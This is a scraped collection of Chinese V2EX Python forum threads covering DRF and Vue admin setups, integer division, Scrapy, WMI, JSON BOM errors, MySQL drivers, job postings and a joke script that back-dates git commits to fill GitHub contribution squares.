就不会。但是无论有没有调用，最终查询的时候都会查出其他用户的 task 。只有显式的调用 check_object_permissions ，对单个 task 权限进行检查，或者在获取 task list 的时候主动过滤，才能达到那种效果。\r<br>3. 当我同时开启了 Django 的 session 认证和 DRF 的 token 认证时，用 token 访问 DRF 创建的 API 就会触发 crsf 防护机制。这虽不算太大的问题，但是也说明了系统优先使用了 session 认证。\r<br>4. DRF 的文档确实少，国内大部分都是翻译，英文文档寥寥几句，最后还得去看源码。\r<br>不过， DRF 配合 django orm 确实减少了很多开发量。</div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><h3>再来说说这两周折腾前端（web）的体会：</h3>\n<ol>\n<li>前端技术真的是非常繁荣，更新也非常快，就在我调研的这几天，我发现github上好多项目都是最近半年内才创建，而且也都是一直在更新，前端组件也很丰富，用npm构建项目也很方便。</li>\n<li>也说说不好的地方，npm上相同功能的组件有很多可选的，但是效果和完成度都参差不齐，很难选择。项目一旦变得复杂，引用大量的npm包，会延长npm的编译时间。前端技术更新虽然快，但过气似乎也很快。。。</li>\n<li>从自己需求的角度出发，直接选择了近期大家呼声最高的vue入手，由于上一次搞前端开发还是用的jquery，用了vue，开发体验真的是一种质的提升，但就这么几天时间也是无法熟练掌握vue的，所以接下来就是找个admin框架改一改，基于vue的admin也有不少，我至少尝试了5种，每个都有那么一点点不中意的地方，最后还是选了github上star最多的vue-admin。</li>\n<li>vue-admin组件不少，完成度也很高，就是缺少一个好用的table组件，所以又上github撸组件。是的，尝试了4种table组件都不满意，最接近需求的就是vuetable-2，但是demo可以跑起来，整合到vue-admin里就出问题，始终渲染不了，而且还会破坏其他的组件，加载一次以后其他页面就出错。</li>\n<li>无奈，又来调研前端技术，同时注意到了vue-blu，iView，element这些组件库，element成熟又完善，完全覆盖我的需求，本土项目，中文文档接地气。</li>\n<li>github上也有一个基于element的admin，vue-manage-system，之前用过，修改完导航菜单，图标丢失，加入vue-auth组件后有问题，就卡住了</li>\n</ol>\n<h2>so，楼主想回头用element自己构建admin，一步一步来</h2>\n</div></div>"], "reply": "20", "tittle": "求推荐一个可以快速开发 web 界面的框架，后端使用 Python", "comment": ["写成 api ，后端只给基本的页面跳转逻辑(也就是不开发 spa 版本)，用 json 传数据，前端只用 jquery 这些易上手的，用 bootstrap 2,这样难度会下降到可接受的程度。", "等前端水平上来了，直接换到 vue.js 等库， api 依然可用，前端大改，后端也就稍微适应一下就行了。", "所以前端也想直接使用 python \r", "\r", "？？？？？", "原文：题主没怎么接触过前端开发，在 adminlte 里摸索了半天，差不多搞懂了 bootstrap3 、 template 这些概念。。。\r", "\r", "\r", "扔给专业的人来做 不好吗？\r", "你这不是差不多搞懂了概念。。。你是前端啥啥不懂啊", "我用 admin LTE 做过管理后台模板。 admin LTE 要想用好光靠后端渲染是不够的，好多 admin LTE 集成的插件是要写 JavaScript 的代码的，获取后端的数据之后通过 JS 来做数据渲染。\r", "如果是想快速在 admin LTE 上面做开发，建议不要用 Django 集成的模板，拆成 restful 的形式， Django 、 flask 、 tornado 什么框架都好，只提供 API 接口。交互效果全部交给 admin LTE 的各种插件完成。这样开发起来会轻松一些。\r", "\r", "其实 admin LTE 这种形式的交互效果，如果要做的业务比较复杂的话，写起来 JavaScript 的代码量还是挺多的，因为要写很多网络请求的接口去拿数据。尤其你的任务系统可能会用到报表，还可能要集成不同的报表插件，所以不要对 admin LTE 抱太大的改造希望。这是一个庞大的管理后台模板，很多效果都是靠不同的插件完成的，实际开发的时候可能要去好几个不同的插件官网查看文档，做好这个心理准备。\r", "\r", "如果有时间和精力学习 JavaScript ，我觉得可以考虑用用 vuejs 方面的模板，我是个主后端的开发，做个人项目的时候最头疼的就是前端交互的逻辑，因为做出来的又丑又繁琐，接触 vuejs 之后，仅仅就是用 vue 替代 jQuery 就省去了我很多写前端渲染的精力，所以在这里推荐一下 vuejs ，考虑一下用它替换 jQuery 试试看？", " 描述出错了，这里的前端指用户界面，不是常见的那个前端", "感谢大家的回复，就不一个一个 @了", "admin lte 只是个壳子。要做出那个样子非常花时间。", "哈哈，前段时间正好在跟楼主做一样的事情， 不过我用的是 flask 尝试的，最后转了一圈发现，发现不如 @", " 说的那样。服务器上用 python 处理任务，然后用 python-eve 把功能做成 REST API ，前端你想怎么改就怎么改了。我准备学习用 vuejs ^_~", "adminlte 只是个模板而已，", "建议:\r", "\r", "\r", "这样弄\r", "\r", "m: django orm\r", "v: vue.js\r", "c: django url\r", "\r", "django 通过 restfulapi 吐出数据给 vuejs 吃", " 是的，我以前也是用的 flask 。\r", "现在也是计划 vuejs ，不过我后端换 golang 了。", "可以看看我们公司维护的这个 django-adminlte ，内置了菜单、权限等功能，直接用 adminlte 的表单和 table 就可以了\r", "\r", " 你这样做, 还不如直接上 SQLAlchemy, 绕个大弯. django db model 性能不是一般的差. django 的 URL 好用吗?   生产环境这样的组合不推荐. 当然看上去题主看上去还在学习中, 这些东西足够展示了.", "问下是自己做吗？我也想弄一个后台任务管理的，自己研究是否可以一起弄弄", " 自己做。\r", "看了上面的回复，这两天在看 django rest framework 和 flask ，又不知道怎么下手了。。。我想把 api 做成 token 验证的，目前暂时卡在 django 的 csrf 验证问题上。", " 用 golang 来做分布式任务吗？是不是 Machinery ，之前也看了一下 Machinery ，感觉没有 python 那么容易集成。", " 为什么不做成只登录验证， api 一般不会知道呀", "adminlte 这个前端模板很容易和 django 结合呀， 用 adminlte 里的 start.html 写一个 `base.html` 的父模板， 然后用 django 的 extends 模板继承就可以了， 剩下的就是数据渲染了， 就这么简单！", "花了两周时间来调研前端技术，收获不少，又确定了大概方向"]},
{"content": ["<div class=\"topic_content\">想试试自己写 bin() 的功能，但是我写的有一步 n = n / 2 如果输入是负数会卡在 -1 / 2 = -1 死循环里。当然这个问题很好解决，但是我就想不通不带浮点的话 1/2=0 我能理解，为啥 -1/2 得到 -1 。\r<br>\r<br>麻烦请从原理上解释一下，谢过。</div>"], "reply": "13", "tittle": "小白问题，-1 / 2 等于几？", "comment": ["向下取整，这又不是四舍五入", "向下取整", "python 是 floor\r", "c 是只看整数", "理解成在箭头向右的数轴上，左边最近的一个整数。", "负数取模问题，参考 ", "我来写个简单易懂的答案\r", "-1 / 2 = (1 - 2) / 2 = 1/2 - 2/2 = 0 - 1 = -1", "为什么我想打楼上那个简单易懂的答案呢？！逗我么。 Round 本来就有 round to zero ， round down, round up 各种啊……", "N/2 相当于 N>>2 。很多编译器都会这么优化掉。\r", "所以-1 的补码全是 1 喽，有符号类型右移完还是全 1 喽", "整数除法和浮点数除法是两回事啊……", "python 文档有专门一节讲这个的", " \r", " 你们不要搞事情😂😂", "不同语言的处理结果并不相同，所以不建议这样用"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>python 成为技术新宠，找到合适的 python 在时间和精力上，有一些难度，还望有经验的同仁分享一下经验，\n助我一臂之力。\n若是有看机会的同仁，可以自我推荐： 0 ）\n若是愿意给我一些好的建议，更是欢喜：*）\n岗位描述：</p>\n<ol>\n<li>负责项目后端服务的技术设计和研发；</li>\n<li>系统性能调优，精简硬件资源需求，例如提高响应 QPS 、降低内存使用等；</li>\n</ol>\n<p>岗位要求：</p>\n<ol>\n<li>本科以上学历， 2 年以上互联网行业工作经验；</li>\n<li>精通 Python/Go /Java 其中一门开发语言，具有良好的编码习惯；</li>\n<li>熟悉 MySQL ，掌握 MySQL 分区、分表、集群等相关设计方案，具备 mysql 优化经验；</li>\n<li>熟悉 Memcache 、 Redis 、 MongoDB 等常用 nosql 解决方案，了解各自的优缺点以及使用场景；</li>\n<li>熟悉 Linux/Unix 操作，熟悉基本的 Shell 脚本；</li>\n</ol>\n<p>我们看重的点：有技术探索热情，有自己的技术路线主张和判断者；</p>\n<pre><code>我的邮箱 xinyu.zhang@rongyg.com.cn,欢迎讨论\n</code></pre>\n</div></div>"], "reply": "2", "tittle": "如何找到合适的 Python ，我很犯愁，请支招", "comment": ["个人觉得以下两点是真心想招人的必备条件，\r", "也是对要招聘人才的尊重\r", "\r", "1. 要有工作地点\r", "2. 除了说明工作职责外，请介绍下公司和待遇", "谢谢乔峰楼上的回复与指点：）\r", "我们的办公地点在中国北京海淀区海淀黄庄\r", "公司做金融大数据方向，待遇略微高于同行业，五险一金，弹性上班时间，薪资 13-14.5 薪"]},
{"content": ["<div class=\"topic_content\">山雨欲来风满楼, 为什么我嗅不到对应的气息( 我现在的感受是: 云淡风轻 ) ?</div>"], "reply": "1", "tittle": "Python 2.7 进入倒计时, 为何我的感受不强烈 ?", "comment": ["啥气息， VB6 20 年了照样好用"]},
{"content": ["<div class=\"topic_content\">虽然 python 也能在 windows 上跑吧，而且跑的都还行，但是总觉得 linux 才是正解吧……我不知道最近的趋势，但是云主机价格就可以看出来， windows 主机都比 linux 贵，为什么要坚持 windows 下跑 python 呢……开个虚拟机很费劲么</div>", "<div class=\"topic_content\">谢谢各位的回复，我个人确实是那种“永远觉得自己是对的人”， 这一点确实是我的不对。各位的观点我已经了解，重点不在运行环境，而在实现的功能和实现的方法，况且对于 python 不同平台下的表现也相差不大，确实没有必要有任何问题。</div>"], "reply": "20", "tittle": "为什么总是会在 Python 频道上看到 windows 环境下运行的 Python", "comment": ["有不少做科学计算的一直用 python, 再说了 python 在客户端的应用也很广泛。\r", "\r", "我 06-14 年一直在 windows 上用 python ，感觉还是不错的。", "存在即是合理", "证明桌面还是 windows 好", "Windows 主机比 Linux 主机贵，可以得出 Windows 不好的结论？", "python 频道是啥？", "因为在一些与楼主观点不同的人眼中，学习编程比折腾虚拟机更重要", "科学计算狗路过…一直一部分环境是 win...", "代码能跑才是关键，系统当然是捡自己最熟的来。", "当一部分人开始付诸行动的时候，一部分人还在纠结环境配置和编辑器。", "当吃灰的时候， windows 可以回些本， linux 行么？", "运行速度都差不多，为什么要纠结平台，而且我在 Windows 上写的时候写考虑了能不能在 Linux 上运行。我用 Linux 写 Python 理由，只有 linux 下 pycharm 的蜜汁速度加成。", "个人感觉两个平台的差别不同\r", "1 ，某些依赖 c 的库在 win 下不太好弄\r", "2 ，文件路径差别\r", "其他差别还没有感受", " win 下几乎所有安装复杂的 python 包都有 exe 直接一键安装 比 mac 和 linux 方便快捷很多。 新手推荐用 win 来学，省力", "难道 python 还要学以前的.net 挑平台么", "我几乎所有 python 都跑在 windows 下面。", "推荐 java maven 搞定一切依赖", "额,你管得有点宽", " \r", "\r", "哈哈哈 ，王大少不是说『你的管有点宽』吗？", " \r", " 讲真回复很呛人，但谢谢你的观点。\r", "我自己个人也是在 windows 下开发 windows 下运行的，就是部署的时候还是会用 linux 机器。", "同上， 在 windows 上进行开发， 完事在服务器上面运行就好了。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><pre><code>class MyDownloaderMiddleware(object):\n\n    def process_request(self, request, spider):\n        res = requests.get(request.url)\n        return HtmlResponse(request.url, body=res.content, encoding='utf-8', request=request)\n</code></pre>\n<p>scrapy 的下载器调教起来不如 requests 方便，所以想用 requests 替代</p>\n</div></div>"], "reply": "13", "tittle": "用 requests 替代 scrapy 的下载器，发现速度很慢，求解", "comment": ["因为你这是一个同步操作,用 deferreds", "又想像同步一样逻辑清晰，又想有异步一样的性能，貌似很难调和呢……", "不要用 requests.get ！\r", "\r", "用同一个 requests.Session ，你能提速一倍以上！", " 能分享个 demo 不，文档啃的太慢\r", " 一直没研究锅 twisted\r", " 实际代码中用的 requests.Session ，但速度比原生还是差的太多", " twisted 的确有点啰嗦……", " 参考 scrapy 源码啊。日难看的，不想看第二遍", " 找到相关源码了 scrapy/core/downloader/handlers/__init__.py\r", " 太别扭了", "Twisted 我硬是没学会。。有一些门槛。。", " 面向需求学习 ←_←", "你这是在乱搞啊，下载中间件是负责修改每个 request 和 response 的，是不做下载这个动作的！你在里面加一个 requests.get 操作，等于每个网页你都下载了两遍，而且这个 get 操作还是同步的！！", "不好意思没认真看，下载了两遍是我说错的，你在 process_request 里返回了 response ，那 scrapy 就不会再去下载这个网页，但这样，并发就完全没有了，跟单线程用 requests 没什么区别", " 嗯，所以需要重写下载器，方便 twisted 异步调用", "可以考虑使用 treq\r"]},
{"content": ["<div class=\"topic_content\">如题，用 wmi 如何获取系统当前登录用户及其登录时间？   类似 query user 的效果，但是用 query user 有些服务器不兼容。 求各位大神指导指导。</div>"], "reply": "16", "tittle": "Python 新手求助，用 wmi 如何获取系统当前登录用户及其登录时间？", "comment": ["别沉呀", "求脚本，求思路", "可以通过查询日志来实现", "   咋弄，：）", "查询 security 日志，登录和退出对应的 eventvid 不同 然后做统计", "一直都用 query user ，这应该也是标准的方法，想知道 LZ 哪里遇到了不兼容，我也注意下。", "\r", "\r", "qwinsta = query session ， 也可以用这个，但我觉得 query user 用不了，这俩也难说。。", " 亲", " 老两口", " 级 1", " ?????", " 对， 这两个都获取不到值。 大概原因是 python 安装 wmi 相关组件", " py-wmi 是对 pywin32 的封装，理论上能调 wmi 自己写 query 就可以读。\r", "\r", "不过要换我，直接 subprocess.popen 读返回值。\r", "\r", "没别的原因，因为我在生产上这个干好几年了，遇到各种坑之后，发现大多数情况 popen 再用 re 提取返回值，方便多了....\r", "\r", "真对 query ，可能要 cmd /c query user", " 能否加个扣扣交流下： 1018654313 ，  非常感谢", "  p=subprocess.Popen(\"query user\", shell=True)；  执行这句说：'query' 不是内部或外部命令，也不是可运行的程序。   但是在另外一个没有集成 wmi 的 python 环境是可以运行并且有返回值的。", " \r", "如果你是 64 位的 Windows ，要用 64 位的 Python 来执行这个命令。\r", "\r", "如果你是 32 位的 Python ， python 作为父进程，子进程执行这个命令是重定向到 c:\\windows\\syswow64\\query.exe ，这里不存在就不行咯。\r", "\r", "关于 syswow64 ，可以百度 googleBing 啦，可以仔细了解下。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>在学 python ，最近看小甲鱼的课程到后面有点懵，又想着重新刷下基础</p>\n<p>在知乎上看到有人发，看着挺诱人的</p>\n<p>大多数课程免费，付费暂时不想，<strong>有没有上过车的老司机</strong></p>\n<p><img alt=\"\" src=\"http://upload-images.jianshu.io/upload_images/118023-b9935cb67bc62cb4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></p>\n<p>这是链接，实验楼的 <a href=\"http://www.shiyanlou.com/paths/python\" rel=\"nofollow\">www.shiyanlou.com/paths/python</a></p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>我的天上线没把我吓死，不不不不是广告帖子，应该很明显不是吧。\n我是一直在学小甲鱼的视频，要说打广告也是打他的广告啦（真的很棒非常感谢他）\n大致明白大家的意思</p>\n<ul>\n<li>学习路径比较推荐</li>\n<li>课程不太好用不推荐</li>\n</ul>\n<hr>\n<ul>\n<li>最好按照官方文档来学习</li>\n<li>就算是按照这个，扎实的学450小时也绝对有帮助</li>\n</ul>\n<hr>\n<p>感谢感谢</p>\n</div></div>"], "reply": "20", "tittle": "看到一个 Python 全套课程", "comment": ["450 小时！", " 是呀，我看着顺序从 linux 入门开始的，应该可以跳过直接从 Python 开始", "啊哈，实验楼…我之前在这实习过", "实验楼上买过 2 个课程，课程编排没有慕课网的好，感觉是骗钱的，广告到处打，比较有名而已，不推荐。", " 实习感受怎么样啊？", "如果你不 copy 里面的代码而是自己写的话, 450 小时都搞定就神了\r", "\r", "老实说之前也在实验楼实习过, 发现很多用户都是直接下教程的代码然后跑一遍就完事儿, 真正读文档自己做的比较少.\r", "\r", "然而其实动手和才坑才是提升自己的关键..", "小甲鱼真厉害，从底层汇编到高级语言，破解逆向啥都懂。", "不推荐。大多是炒冷饭。实际上你学不到什么东西，不要以为看了课程目录仿佛已经荣升 Python 高级工程师了……", " 同问", " \r", " 总体感觉：挺好 \r", "只是没有什么差别对待，老大和团队的人都很 nice 。不过我没记错的话，我实习的时候还没有推出收费课程吧，之后就没怎么去实验楼官网看过了...", "收藏了，学习路线图有点用", "建议按照 Python 官网的文档进行学习", "这是广告贴吗？", " 明白啦", " 不不不当然不是，看我刚刚写的附言", " 按照官方这个路径我还一直没试过，也不知道枯不枯燥（我还没试过就不做评价啦），感谢那我也开始看官方文档好了", " 我也是看到路线才被吸引的", " 是啊，我几乎全是看他的视频来学习的", " 没没没，当然不会就轻信学完就是高级工程师（哪有那么简单", " 深有感触就是，不自己看文档打代码根本是没什么用的"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><blockquote>\n<p>申明：仅供测试，仅供娱乐</p>\n</blockquote>\n<p>代码行数： 29 行</p>\n<h2>效果</h2>\n<p><img alt=\"result\" src=\"https://github.com/gaojiuli/greenbox/raw/master/result.png\"></p>\n<h2>用法</h2>\n<ol>\n<li>fork</li>\n<li>clone</li>\n<li>run <em>python <a href=\"http://greenbox.py\" rel=\"nofollow\">greenbox.py</a></em></li>\n<li>push</li>\n</ol>\n<h2>项目地址</h2>\n<p><a href=\"https://github.com/gaojiuli/greenbox\" rel=\"nofollow\">https://github.com/gaojiuli/greenbox</a></p>\n<h2>申明</h2>\n<p>仅供娱乐</p>\n</div></div>", "<div class=\"topic_content\">别人 fork 的备份， <a target=\"_blank\" href=\"https://github.com/xia0ming/greenbox\" rel=\"nofollow\">https://github.com/xia0ming/greenbox</a></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p><img alt=\"https://github.com/xia0ming/greenbox/raw/master/result.png\" src=\"https://github.com/xia0ming/greenbox/raw/master/result.png\"></p>\n</div></div>"], "reply": "29", "tittle": "无聊之极，写了一个自动填满 github 绿格子的脚本!365 天全绿哟!", "comment": ["刚测了一下，并没有成功", " 如果没有成功，你可以直接把里面的 python 脚本到自己的任何一个项目，然后运行它，然后 push 到自己的项目", "我去删除项目了\r", "\r", "## 代码如下\r", "\r", "```python\r", "import datetime\r", "import os\r", "from random import randint\r", "\r", "now = datetime.datetime.now()\r", "start = now.replace(year=2016)\r", "\r", "\r", "def change_day():\r", "    return datetime.timedelta(days=1, seconds=randint(0, 60), minutes=randint(0, 60), hours=randint(0, 24))\r", "\r", "\r", "def change_time():\r", "    return datetime.timedelta(seconds=randint(0, 60), minutes=randint(0, 60))\r", "\r", "\r", "commit_date = (start + change_day())\r", "times = randint(5, 30)\r", "\r", "while commit_date < now:\r", "\r", "    commit_date = commit_date + change_day()\r", "    for i in range(times):\r", "        f = open('data.txt', 'a+')\r", "        commit_date = commit_date + change_time()\r", "        f.writelines(commit_date.isoformat() + '\\n')\r", "        f.close()\r", "        os.system('git add .')\r", "        os.system('git commit --date={time} -m \"Update {time}\"'.format(time=commit_date.isoformat()))\r", "```", " 我就是新建一个仓库，然后脚本复制过去执行提交，然而- -。", " push 后大约 30 秒， github 会统计出来．　你甚至可以放到你的其它项目里面执行", "你把项目删了， f = open('data.txt', 'a+') 怎么破", " 　脚本在上面，哪里有问题吗", " 没事了", " 然而我就成功了，不知道会不会被删除。", "能不能不要这样...", " 本地跑了下， git commit 的时间都 3.29 了=-=", "很爽啊，楼主自学 python ？", "没事还是多陪陪媳妇不好？不要那啥也绿了， python 可刷不红啊。", " 你一定是哪里操作错了", " 嘻嘻", " 前提是。。。", " 自学的啊", " 下班后才陪媳妇儿呀", " 你猜错啦", "还可以把 git 的邮箱名改成 Linus Torvalds 等各路大神的，再 commit ，然后发现你的 repo 真是众星云集啊！不过，这并没有什么卵用。", "这个花样更多:\r", " 上班时间无聊之极……楼主是哪个单位的？", "所以，自动填满格子意义何在？", " 呵呵，感觉没啥实际用途。", "骗人骗己", "好无趣的玩意。。", "全刷绿，再到淘宝买 GitHub 刷 star 服务，短时间内成为开源大神", "果然无聊之极。", "请问楼主单位还招人吗"]},
{"content": ["<div class=\"topic_content\">我猜这里很多人不用 51job ，不过 lz 是苦逼的传统行业，想没事用 python 登录下 51job 刷下简历，本机上是没什么问题了，放到 aws 上怎么就不行了，难道他们不让国外 ip 访问？智联貌似就没问题，这个要怎么解决，设 vpn ？</div>"], "reply": "14", "tittle": "有没有人研究过 51job 的登录", "comment": ["你的疑问貌似可以很简单就能验证吧", "没研究过，应该不会禁国外 IP 吧。既然你本机都可以了 试试用国内代理访问呗", " 的确啊 感觉没什么好问的= =", "\r", " 手头上没有稳定的国内 vpn ， 所以想问问是不是通过修改登录请求的 headers 什么的解决，或者 51job 有没有什么对国际访问的 ip 什么的", "是不是被检测到异地登录了", " \r", "\r", "貌似不是，异地登录会跳验证码，这个直接拒绝连接了\r", "\r", "你和 3 楼什么关系？超级马甲？", "大概是去年偶而登录一下 51job ，感觉每次登录都要至少两次才成功。\r", "\r", "第一次输入用户名密码，密码确定是对的，然按确定不能成功，会跳到带验证码的登录输入页面，然后再输入一遍，这才能成功进入个人管理页面。", " 没有任何关系，不是马甲", "直接在头部添加登录后的 Cookie 不行么？", "你都没说怎么不行，什么情景\r", "难道让别人给你试？\r", "再说你可真不是没事，是接到活了吧", "IP 黑名单了吧？直接在服务器请求看下返回信息", "username = \"\"\r", "    password = \"\"\r", "    s = requests.session()\r", "    url_login = \"http://m.51job.com/my/login.php\"\r", "    url_login_post = \"http://m.51job.com/ajax/my/login.ajax.php\"\r", "    url_refresh = \"http://m.51job.com/ajax/resume/refreshresume.ajax.php\"\r", "    resume_id = \"\"\r", "    uagent = \"Mozilla/5.0 (Linux; Android 4.0.4; \\\r", "                Galaxy Nexus Build/IMM76B) AppleWebKit/535.19 (KHTML, like Gecko) \\\r", "                Chrome/18.0.1025.133 Mobile Safari/535.19\"\r", "    \r", "    headers = {\r", "        \"user-agent\": uagent,\r", "    }\r", "\r", "    rsp1 = s.get(url_login)\r", "\r", "    params_login = {\r", "            \"username\": username,\r", "            \"password\": password,\r", "            \"verifycode\": \"\",\r", "            \"autologin\": \"0\"\r", "    }\r", "    rsp2 = s.post(url_login_post, headers=headers, data=params_login)\r", "    rsp2.encoding = 'utf-8'\r", "    jsn = json.loads(rsp2.text)\r", "    if not jsn['status'] == \"1\":\r", "        raise LoginError(\"51job login error\")\r", "\r", "\r", "EC2 上跑的话直接 Timeout,之前抓异地登陆的结果是能正常返回 Json, 里面 status 为 1,\r", "\r", "requests.exceptions.Timeout: (<urllib3.connectionpool.HTTPConnectionPool object at 0x7ff0bbddba90>, 'Connection to ", " timed out. (connect timeout=9.2)')", "在你的 ec2 上用 mtr 51job 的域名 看看哪一跳有问题 有的时候也可能是墙在搞鬼", "requests cookie 最简单了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>代码：</p>\n<p>'''</p>\n<h1>-<em>- coding: utf-8 -</em>-</h1>\n<p>print('中文')\n'''</p>\n<p>报错：</p>\n<p>'''\nFile \"C:\\Users\\Cstome\\AppData\\Local\\Programs\\Python\\Python35\\lib\\encodings\\<a href=\"http://cp437.py\" rel=\"nofollow\">cp437.py</a>\", line 19, in encode\nreturn codecs.charmap_encode(input,self.errors,encoding_map)[0]\nUnicodeEncodeError: 'charmap' codec can't encode characters in position 85-90: character maps to &lt;undefined&gt;\n'''</p>\n<p>local 切换成简体中文就好了，但除此之外还有其他方法吗？</p>\n</div></div>"], "reply": "1", "tittle": "Python 在英文版 Windows 系统下显示中文报错该怎么解决？", "comment": ["The character encoding is platform-dependent. Under Windows, if the stream is interactive (that is, if its isatty() method returns True), the console codepage is used, otherwise the ANSI code page. Under other platforms, the locale encoding is used (see locale.getpreferredencoding()).\r", "\r", "Under all platforms though, you can override this value by setting the PYTHONIOENCODING environment variable before starting Python.\r", "\r", "所以，试试启动 python 前 chcp 65001"]},
{"content": ["<div class=\"topic_content\">公司在广州番禺区，属于互联网行业，岗位要求大专以上学历， 2 年以上工作经验，会 MySQL/Postgres ,熟悉 Linux 常用命令或有 Mac 下的开发经验，能在常见 Linux 服务器（ CentOS/Ubuntu ）上简单排查问题，熟悉 Nginx/Apache 等 Web 服务器的配置,至少精通一种 Python 框架（ Django/Tornado ）,福利待遇多多，有意向者可发简历到： <a target=\"_blank\" href=\"mailto:maxiaoxuan@hoge.cn\">maxiaoxuan@hoge.cn</a> ，非诚勿扰， O(∩_∩)O 谢谢！</div>"], "reply": "目前尚无回", "tittle": "诚聘一名 2 年经验以上的 Python 工程师", "comment": []},
{"content": ["<div class=\"topic_content\">a 为 string 类型\r<br>﻿{\"ret\":0,\"msg\":\"OK\",\"data\":[{\"code\":\"000502\",\"name\":\"绿景控股\",\"total\":1900,\"cansel\":1900,\"newprice\":17.25,\"costprice\":17.299},{\"code\":\"002758\",\"name\":\"华通医药\",\"total\":1100,\"cansel\":1100,\"newprice\":28.25,\"costprice\":28.354},{\"code\":\"002778\",\"name\":\"高科石化\",\"total\":800,\"cansel\":800,\"newprice\":39.01,\"costprice\":38.979}]}\r<br>请问如何高效将其转换为 dic 类型\r<br>直接采用 eval()函数失败，错误代码 SyntaxError: invalid character in identifier\r<br>谢谢</div>"], "reply": "11", "tittle": "求助， str 转 dic 问题。", "comment": ["你这个不是 json 吗， json parse", "json.loads()？ \r", "这是 PY 不是 JS", "json.loads", "json.loads(a)返回异常 json.decoder.JSONDecodeError: Unexpected UTF-8 BOM (decode using utf-8-sig): line 1 column 1 (char 0)", "string 不能转 dict,用 json 处理", " 尝试 json.loads()会抛出异常： Unexpected UTF-8 BOM", "r#6 @", " BOM 问题，那就再试试 json.loads(a[1:]) 或者 json.loads(a[3:])", "找到解决方案了\r", "if a.startswith(u'\\ufeff'):\r", "    a = a.encode('utf8')[3:].decode('utf8')\r", "然后再 json.loads(a)\r", "百度到的， text 包含 BOM 字符，在线接口编码的问题吧，谢谢各位。", " 谢谢", "import simplejson\r", "simplejson.loads(a)", "这个问题可以先用 repr 把数据打出来看看，根据具体问题进行替换或者采用其他解决方式，然后再用 eval 解决。"]},
{"content": ["<div class=\"topic_content\">我最近写了一个比较复杂的程序，就在思考这个问题，我需要自己去设计特定的异常类吗？\r<br>如果要设计异常类，有什么注意的原则吗，感觉如果考虑各种可能出现异常的地方，我感觉可能出错的地方好多，设计起来就特别费劲了，不知道怎么搞了</div>"], "reply": "1", "tittle": "各位在写一个比较复杂的程序时，会自己设计一套异常类吗", "comment": ["不管是什么语音，只要你觉得有必要就可以自己写一个，什么是有必要呢？我觉得只要是自己对异常要二次处理就是有必要"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><pre><code>Mysqldb这个库好像不支持异步\n如果都用的是这个库的话，不支持也没有办法。。\n我也只能用 Mysql-python\n\n</code></pre>\n</div></div>"], "reply": "11", "tittle": "问下你们使用 gevent+flask 的时候用的什么 mysql 驱动", "comment": ["不用 pymysql 不能 patch 吧。", "官方的 mysql-connector 吧，生产环境用了很长时间了", " 你是用的 pymysql ？有没有出什么问题？", "\r", "\r", "可以试试这个。", " 你用的什么？", "mysql-connector 生产环境 ok ，就是 connection pool 有点蠢 size 是死的不是很好处理，想要灵活连接池重用得自己写。", "  mysql-connector 到底是哪个库？", " ", "用 pymysql 才能和 gevent 配合", "兼容的 MySQLdb 可以用豆瓣的 greenify+patch 后的 MySQLdb,不过貌似不维护了\r", "原来也用过 ultramysql,有坑也不维护了\r", "生产环境还是选 pure python 实现", " pymysql?"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>偶然间发现简书这个网站对 markdown 支持的很不错。界面看起来也很漂亮。</p>\n<p>所以就想写一个博客。想了半天博客里面放什么，意识到最近 python 爬虫学的挺带劲的，所以干脆一不做二不休，写了一个 python 爬虫从零开始的教程。</p>\n<p>但毕竟对爬虫的了解还是有限，我把__<a href=\"http://www.jianshu.com/p/9c266216957b\" rel=\"nofollow\">博客-爬虫其实很简单</a>__贴在这里，有什么问题也希望大家多多指正。</p>\n<p>（顺便问一下。。之前又一篇相同的文章发错了区，要怎么撤回呢？）</p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>第二篇文章出炉了，还请大家多多指教哦～<a href=\"http://www.jianshu.com/p/e3444c52c043\" rel=\"nofollow\"> [爬虫其实很简单] 模拟登陆与文件下载</a></p>\n</div></div>"], "reply": "47", "tittle": "突发奇想，准备开坑一个从零开始的 Python 爬虫教程", "comment": ["不错，坚持加油！\r", "最近我在捣鼓 flask 。。。。", "已收藏 加油", "已收藏", "互联网似乎缺少一个真正的在线写书的平台", "已关注。期待后续~", "碉堡了，写的不错", "好了，我又来搭车传销了，也是爬虫，也是 糗事百科。。。写了大半年了\r", "\r", "\r", "\r", "专题系列，有些坑其实还没填。。。", " 有写书平台的， Gitbook", "很详细，支持", "写的挺好啊", "支持，谢谢，期待续集", " 也许需要一个接地气的?", "蟹蟹", "教程类的很容易上星星，如果论坛愿意给你置顶，上千星星简直是易如反掌。", "支持！希望能讲的深入点，分布式，登录验证神马的。既然边探索边教，不放把踩过的坑都写写😀", "挖坑记得填好啊。。", "我觉得把，如果写爬虫教程还需要一步一步教他们怎么用 pip ， 简直就是浪费时间吧。\r", "\r", "这种文章，百度一下一大堆（并不是在否认楼主的工作）\r", "\r", "我是觉得吧，入门的文章多如牛毛，然后深入的文章，整个百度可能只有一篇。\r", "\r", "与其教怎么入门，不如试下解决难点。\r", "\r", "\r", "\r", " 我在着魔写框架， 难受", "不错~加油！", " 哈哈好的啊，我也在不断的学习。我会不断的把学到的结合自己的理解都加上去的～", " \r", "嗯嗯你说的也有道理。\r", "\r", "可能我觉得我的教程定位有点不一样。我希望我能够带那些徘徊在门口不敢进去，在不断张望的人一个入口。让他们也感受到爬虫的简单与有趣。\r", "\r", "你说的难点确实也是很重要的。我也在不断的学习攻克一些东西，这个教程也会慢慢的由浅入深，慢慢的过渡到比较高级的事情上面去。\r", "\r", "非常感谢你的建议。我也会认真思考我的教程的定位点在哪里的。", "同意 killerd 的观点…网上好像总览性的内容不多（可能是我没找到…", "说实话， 写 python 教程的都是爬虫。。。还不如写写怎么抓怎么好玩的思路什么的", " 